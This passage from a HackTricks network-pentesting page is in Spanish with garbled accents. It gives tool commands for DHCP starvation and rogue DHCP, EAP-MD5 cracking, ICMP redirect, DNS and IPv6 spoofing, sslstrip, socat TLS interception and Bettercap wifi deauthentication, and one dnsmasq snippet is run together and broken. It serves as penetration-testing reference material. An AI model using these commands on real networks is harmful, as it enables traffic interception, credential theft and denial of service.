**DoS**

Se pueden realizar **dos tipos de DoS** contra servidores DHCP. El primero consiste en **simular suficientes hosts falsos para utilizar todas las direcciones IP posibles**.\
Este ataque solo funcionar√° si puedes ver las respuestas del servidor DHCP y completar el protocolo (**Descubrir** (Comp) --> **Ofrecer** (servidor) --> **Solicitud** (Comp) --> **ACK** (servidor)). Por ejemplo, esto **no es posible en redes Wifi**.

Otra forma de realizar un DoS de DHCP es enviar un **paquete DHCP-RELEASE utilizando como c√≥digo fuente todas las IP posibles**. Entonces, el servidor pensar√° que todos han terminado de usar la IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Una forma m√°s autom√°tica de hacer esto es usando la herramienta [DHCPing](https://github.com/kamorin/DHCPig)

Podr√≠as utilizar los ataques de denegaci√≥n de servicio mencionados para forzar a los clientes a obtener nuevas concesiones dentro del entorno, y agotar los servidores leg√≠timos para que se vuelvan no responsivos. As√≠, cuando los leg√≠timos intenten reconectarse, **puedes servir valores maliciosos mencionados en el siguiente ataque**.

#### Establecer valores maliciosos

Se puede configurar un servidor DHCP falso utilizando el script DHCP ubicado en `/usr/share/responder/DHCP.py`. Esto es √∫til para ataques de red, como capturar tr√°fico HTTP y credenciales, redirigiendo el tr√°fico a un servidor malicioso. Sin embargo, establecer un gateway falso es menos efectivo ya que solo permite capturar el tr√°fico saliente del cliente, perdiendo las respuestas del gateway real. En su lugar, se recomienda configurar un servidor DNS o WPAD falso para un ataque m√°s efectivo.

A continuaci√≥n se muestran las opciones de comando para configurar el servidor DHCP falso:

* **Nuestra Direcci√≥n IP (Anuncio de Gateway)**: Usa `-i 10.0.0.100` para anunciar la IP de tu m√°quina como el gateway.
* **Nombre de Dominio DNS Local**: Opcionalmente, usa `-d example.org` para establecer un nombre de dominio DNS local.
* **IP del Router/Gateway Original**: Usa `-r 10.0.0.1` para especificar la direcci√≥n IP del router o gateway leg√≠timo.
* **IP del Servidor DNS Primario**: Usa `-p 10.0.0.100` para establecer la direcci√≥n IP del servidor DNS falso que controlas.
* **IP del Servidor DNS Secundario**: Opcionalmente, usa `-s 10.0.0.1` para establecer una IP de servidor DNS secundario.
* **M√°scara de Red Local**: Usa `-n 255.255.255.0` para definir la m√°scara de red para la red local.
* **Interfaz para Tr√°fico DHCP**: Usa `-I eth1` para escuchar el tr√°fico DHCP en una interfaz de red espec√≠fica.
* **Direcci√≥n de Configuraci√≥n WPAD**: Usa `-w ‚Äúhttp://10.0.0.100/wpad.dat‚Äù` para establecer la direcci√≥n de configuraci√≥n WPAD, ayudando en la interceptaci√≥n del tr√°fico web.
* **Suplantar la IP del Gateway Predeterminado**: Incluye `-S` para suplantar la direcci√≥n IP del gateway predeterminado.
* **Responder a Todas las Solicitudes DHCP**: Incluye `-R` para hacer que el servidor responda a todas las solicitudes DHCP, pero ten en cuenta que esto es ruidoso y puede ser detectado.

Al utilizar correctamente estas opciones, se puede establecer un servidor DHCP falso para interceptar el tr√°fico de red de manera efectiva.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **Ataques EAP**

Aqu√≠ hay algunas t√°cticas de ataque que se pueden utilizar contra implementaciones 802.1X:

* Molienda activa de contrase√±as por fuerza bruta a trav√©s de EAP
* Atacar el servidor RADIUS con contenido EAP malformado _\*\*_(exploits)
* Captura de mensajes EAP y craqueo de contrase√±as sin conexi√≥n (EAP-MD5 y PEAP)
* Forzar la autenticaci√≥n EAP-MD5 para evitar la validaci√≥n del certificado TLS
* Inyectar tr√°fico de red malicioso al autenticar usando un concentrador o similar

Si el atacante se encuentra entre la v√≠ctima y el servidor de autenticaci√≥n, podr√≠a intentar degradar (si es necesario) el protocolo de autenticaci√≥n a EAP-MD5 y capturar el intento de autenticaci√≥n. Luego, podr√≠a realizar fuerza bruta utilizando:
```
eapmd5pass ‚Äìr pcap.dump ‚Äìw /usr/share/wordlist/sqlmap.txt
```
### Ataques FHRP (GLBP & HSRP) <a href="#id-6196" id="id-6196"></a>

**FHRP** (Protocolo de Redundancia del Primer Salto) es una clase de protocolos de red dise√±ados para **crear un sistema de enrutamiento redundante en caliente**. Con FHRP, los enrutadores f√≠sicos pueden combinarse en un dispositivo l√≥gico √∫nico, lo que aumenta la tolerancia a fallos y ayuda a distribuir la carga.

**Los ingenieros de Cisco Systems han desarrollado dos protocolos FHRP, GLBP y HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Se conocen tres versiones del Protocolo de Informaci√≥n de Enrutamiento (RIP): RIP, RIPv2 y RIPng. Los datagramas se env√≠an a pares a trav√©s del puerto 520 utilizando UDP en RIP y RIPv2, mientras que los datagramas se transmiten al puerto 521 de UDP a trav√©s de multidifusi√≥n IPv6 en RIPng. RIPv2 introdujo el soporte para autenticaci√≥n MD5. Por otro lado, RIPng no incorpora autenticaci√≥n nativa; en su lugar, se basa en los encabezados opcionales IPsec AH y ESP dentro de IPv6.

* **RIP y RIPv2:** La comunicaci√≥n se realiza a trav√©s de datagramas UDP en el puerto 520.
* **RIPng:** Utiliza el puerto UDP 521 para transmitir datagramas mediante multidifusi√≥n IPv6.

Es importante tener en cuenta que RIPv2 admite autenticaci√≥n MD5, mientras que RIPng no incluye autenticaci√≥n nativa, confiando en los encabezados IPsec AH y ESP en IPv6.

### Ataques EIGRP

**EIGRP (Protocolo de Enrutamiento de Puerta de Enlace Interior Mejorado)** es un protocolo de enrutamiento din√°mico. **Es un protocolo de vector de distancia.** Si no hay **autenticaci√≥n** y configuraci√≥n de interfaces pasivas, un **intruso** puede interferir con el enrutamiento EIGRP y causar **envenenamiento de tablas de enrutamiento**. Adem√°s, la red EIGRP (tambi√©n conocida como sistema aut√≥nomo) **es plana y no tiene segmentaci√≥n en zonas**. Si un **atacante inyecta una ruta**, es probable que esta ruta se **propague** por todo el sistema aut√≥nomo EIGRP.

Para atacar un sistema EIGRP se requiere **establecer una vecindad con un enrutador EIGRP leg√≠timo**, lo que abre muchas posibilidades, desde reconocimiento b√°sico hasta diversas inyecciones.

[**FRRouting**](https://frrouting.org/) te permite implementar **un enrutador virtual que admite BGP, OSPF, EIGRP, RIP y otros protocolos.** Todo lo que necesitas hacer es implementarlo en el sistema del atacante y realmente puedes hacer como si fueras un enrutador leg√≠timo en el dominio de enrutamiento.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/) tiene capacidades para interceptar las transmisiones de EIGRP (Protocolo de Enrutamiento de Puerta de Enlace Interior Mejorado). Tambi√©n permite la inyecci√≥n de paquetes, que se pueden utilizar para alterar configuraciones de enrutamiento.

### OSPF

En el protocolo Open Shortest Path First (OSPF) se emplea com√∫nmente la autenticaci√≥n MD5 para garantizar una comunicaci√≥n segura entre enrutadores. Sin embargo, esta medida de seguridad puede ser comprometida utilizando herramientas como Loki y John the Ripper. Estas herramientas son capaces de capturar y descifrar hashes MD5, exponiendo la clave de autenticaci√≥n. Una vez obtenida esta clave, se puede utilizar para introducir nueva informaci√≥n de enrutamiento. Para configurar los par√°metros de ruta y establecer la clave comprometida, se utilizan las pesta√±as _Inyecci√≥n_ y _Conexi√≥n_, respectivamente.

* **Captura y Descifrado de Hashes MD5:** Se utilizan herramientas como Loki y John the Ripper para este prop√≥sito.
* **Configuraci√≥n de Par√°metros de Ruta:** Se realiza a trav√©s de la pesta√±a _Inyecci√≥n_.
* **Establecimiento de la Clave Comprometida:** La clave se configura en la pesta√±a _Conexi√≥n_.

### Otras Herramientas y Fuentes Gen√©ricas

* [**Above**](https://github.com/c4s73r/Above): Herramienta para escanear el tr√°fico de red y encontrar vulnerabilidades
* Puedes encontrar **m√°s informaci√≥n sobre ataques de red** [**aqu√≠**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Suplantaci√≥n**

El atacante configura todos los par√°metros de red (GW, IP, DNS) del nuevo miembro de la red enviando respuestas DHCP falsas.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Verifica la [secci√≥n anterior](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect consiste en enviar un paquete ICMP tipo 1 c√≥digo 5 que indica que el atacante es la mejor manera de llegar a una IP. Entonces, cuando la v√≠ctima quiera contactar a la IP, enviar√° el paquete a trav√©s del atacante.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### Suplantaci√≥n de DNS

El atacante resolver√° algunos (o todos) los dominios que solicite la v√≠ctima.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurar tu propio DNS con dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Pasarelas Locales

A menudo existen m√∫ltiples rutas a sistemas y redes. Al construir una lista de direcciones MAC dentro de la red local, utiliza _gateway-finder.py_ para identificar hosts que admiten el reenv√≠o de IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Suplantaci√≥n de LLMNR, NBT-NS y mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Para la resoluci√≥n local de host cuando las b√∫squedas de DNS no tienen √©xito, los sistemas de Microsoft dependen de **Link-Local Multicast Name Resolution (LLMNR)** y del **Servicio de Nombre NetBIOS (NBT-NS)**. De manera similar, **Apple Bonjour** y las implementaciones de **configuraci√≥n cero de Linux** utilizan **Multicast DNS (mDNS)** para descubrir sistemas dentro de una red. Debido a la naturaleza no autenticada de estos protocolos y su funcionamiento sobre UDP, enviando mensajes de difusi√≥n, pueden ser explotados por atacantes que buscan redirigir a los usuarios a servicios maliciosos.

Puedes hacer pasar por servicios que son buscados por hosts utilizando Responder para enviar respuestas falsas.\
Lee aqu√≠ m√°s informaci√≥n sobre [c√≥mo hacer pasar por servicios con Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Suplantaci√≥n de WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Los navegadores com√∫nmente emplean el **protocolo de Descubrimiento Autom√°tico de Proxy Web (WPAD) para adquirir autom√°ticamente la configuraci√≥n de proxy**. Esto implica obtener detalles de configuraci√≥n de un servidor, espec√≠ficamente a trav√©s de una URL como "http://wpad.example.org/wpad.dat". El descubrimiento de este servidor por parte de los clientes puede ocurrir a trav√©s de varios mecanismos:

* A trav√©s de **DHCP**, donde el descubrimiento se facilita utilizando una entrada de c√≥digo especial 252.
* Por **DNS**, que implica buscar un nombre de host etiquetado como _wpad_ dentro del dominio local.
* A trav√©s de **Microsoft LLMNR y NBT-NS**, que son mecanismos de respaldo utilizados en casos donde las b√∫squedas de DNS no tienen √©xito.

La herramienta Responder aprovecha este protocolo al actuar como un **servidor WPAD malicioso**. Utiliza DHCP, DNS, LLMNR y NBT-NS para enga√±ar a los clientes para que se conecten a √©l. Para profundizar en c√≥mo los servicios pueden ser suplantados utilizando Responder [consulta esto](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Suplantaci√≥n de dispositivos SSDP y UPnP](spoofing-ssdp-and-upnp-devices.md)

Puedes ofrecer diferentes servicios en la red para intentar **enga√±ar a un usuario** para que ingrese algunas **credenciales en texto plano**. **M√°s informaci√≥n sobre este ataque en** [**Suplantaci√≥n de dispositivos SSDP y UPnP**](spoofing-ssdp-and-upnp-devices.md)**.**

### Suplantaci√≥n de Vecino IPv6

Este ataque es muy similar a la Suplantaci√≥n de ARP pero en el mundo IPv6. Puedes hacer que la v√≠ctima piense que la direcci√≥n IPv6 de la puerta de enlace tiene la MAC del atacante.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### Suplantaci√≥n/Inundaci√≥n de Anuncios de Router IPv6

Algunos sistemas operativos configuran por defecto la puerta de enlace a partir de los paquetes RA enviados en la red. Para declarar al atacante como router IPv6 puedes usar:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### Suplantaci√≥n de DHCP IPv6

Por defecto, algunos sistemas operativos intentan configurar el DNS leyendo un paquete DHCPv6 en la red. Entonces, un atacante podr√≠a enviar un paquete DHCPv6 para configurarse a s√≠ mismo como DNS. El DHCP tambi√©n proporciona un IPv6 a la v√≠ctima.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (p√°gina falsa e inyecci√≥n de c√≥digo JS)

## Ataques en Internet

### sslStrip

B√°sicamente lo que hace este ataque es, en caso de que el **usuario** intente **acceder** a una p√°gina **HTTP** que est√° **redirigiendo** a la versi√≥n **HTTPS**. **sslStrip** mantendr√° una **conexi√≥n HTTP con** el **cliente y una conexi√≥n HTTPS con** el **servidor** para poder **husmear** la conexi√≥n en **texto plano**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
M√°s informaci√≥n [aqu√≠](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ y dns2proxy para evadir HSTS

La **diferencia** entre **sslStrip+ y dns2proxy** frente a **sslStrip** es que **redirigir√°n** por ejemplo _**www.facebook.com**_ **a** _**wwww.facebook.com**_ (nota la **"w" extra**) y establecer√°n la **direcci√≥n de este dominio como la IP del atacante**. De esta manera, el **cliente** se **conectar√°** a _**wwww.facebook.com**_ **(el atacante)** pero en segundo plano **sslstrip+** **mantendr√°** la **conexi√≥n real** a trav√©s de https con **www.facebook.com**.

El **objetivo** de esta t√©cnica es **evitar HSTS** porque _**wwww**.facebook.com_ **no** se guardar√° en la **cach√©** del navegador, por lo que se enga√±ar√° al navegador para realizar **autenticaci√≥n de Facebook en HTTP**.\
Ten en cuenta que para llevar a cabo este ataque, la v√≠ctima tiene que intentar acceder inicialmente a [http://www.faceook.com](http://www.faceook.com) y no https. Esto se puede hacer modificando los enlaces dentro de una p√°gina http.

M√°s informaci√≥n [aqu√≠](https://www.bettercap.org/legacy/#hsts-bypass), [aqu√≠](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) y [aqu√≠](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip o sslStrip+ ya no funcionan. Esto se debe a que hay reglas HSTS preguardadas en los navegadores, por lo que incluso si es la primera vez que un usuario accede a un dominio "importante", lo har√° a trav√©s de HTTPS. Adem√°s, ten en cuenta que las reglas preguardadas y otras reglas generadas pueden usar la bandera** [**`includeSubdomains`**](https://hstspreload.appspot.com) **por lo que el ejemplo de** _**wwww.facebook.com**_ **anterior ya no funcionar√°, ya que** _**facebook.com**_ **utiliza HSTS con `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## Escuchar TCP en el puerto
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## Escuchar TCP + SSL en el puerto

#### Generar claves y certificado autofirmado
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Escuchar usando certificado
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Escuchar usando certificado y redirigir a los hosts
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
A veces, si el cliente comprueba que la CA es v√°lida, podr√≠as **servir un certificado de otro nombre de host firmado por una CA**.\
Otra prueba interesante es servir un **certificado del nombre de host solicitado pero autofirmado**.

Otras cosas para probar son intentar firmar el certificado con un certificado v√°lido que no sea una CA v√°lida. O utilizar la clave p√∫blica v√°lida, forzar el uso de un algoritmo como diffie hellman (uno que no necesite descifrar nada con la clave privada real) y cuando el cliente solicite una sonda de la clave privada real (como un hash), enviar una sonda falsa y esperar que el cliente no lo compruebe.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Notas de Descubrimiento Activo

Ten en cuenta que cuando se env√≠a un paquete UDP a un dispositivo que no tiene el puerto solicitado, se env√≠a un ICMP (Puerto Inalcanzable).

### **Descubrimiento ARP**

Los paquetes ARP se utilizan para descubrir qu√© IPs se est√°n utilizando dentro de la red. La PC tiene que enviar una solicitud para cada direcci√≥n IP posible y solo responder√°n las que se est√©n utilizando.

### **mDNS (multicast DNS)**

Bettercap env√≠a una solicitud mDNS (cada X ms) pidiendo **\_services\_.dns-sd.\_udp.local**. La m√°quina que ve este paquete generalmente responde a esta solicitud. Luego, solo busca m√°quinas que respondan a "services".

**Herramientas**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (Servidor de Nombres NetBios)**

Bettercap env√≠a paquetes de difusi√≥n al puerto 137/UDP pidiendo el nombre "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Protocolo de Descubrimiento de Servicios Simples)**

Bettercap env√≠a paquetes SSDP de difusi√≥n buscando todo tipo de servicios (Puerto UDP 1900).

### **WSD (Descubrimiento de Servicios Web)**

Bettercap env√≠a paquetes WSD de difusi√≥n buscando servicios (Puerto UDP 3702).

## Referencias

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **Network Security Assessment: Know Your Network (3rd edition)**
* **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Consejo de recompensa por errores**: **Reg√≠strate** en **Intigriti**, una **plataforma premium de recompensas por errores creada por hackers, para hackers**! ¬°√önete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy, y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
